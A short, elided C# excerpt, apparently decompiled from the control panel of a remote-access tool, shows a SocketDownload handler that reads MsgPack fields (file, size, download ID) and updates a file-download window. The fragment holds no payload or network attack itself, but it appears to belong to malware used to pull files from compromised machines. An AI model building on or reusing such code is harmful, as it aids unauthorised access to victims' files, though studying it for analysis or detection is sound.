	...
	public async void SocketDownload(Clients client, MsgPack unpack_msgpack)
	{
		try
		{
			...
			case "pre":
			{
				...
				string asString3 = unpack_msgpack.ForcePathObject("File").AsString;
				string asString4 = unpack_msgpack.ForcePathObject("Size").AsString;
				FormDownloadFile formDownloadFile = (FormDownloadFile)Application.OpenForms["socketDownload:" + asString2];
				if (formDownloadFile != null)
				{
					formDownloadFile.Client = client;
					formDownloadFile.labelfile.Text = Path.GetFileName(asString3);
					formDownloadFile.FileSize = Convert.ToInt64(asString4);
			...
			case "save":
				try
				{
					string asString = unpack_msgpack.ForcePathObject("DWID").AsString;
					FormDownloadFile SD = (FormDownloadFile)Application.OpenForms["socketDownload:" + asString];
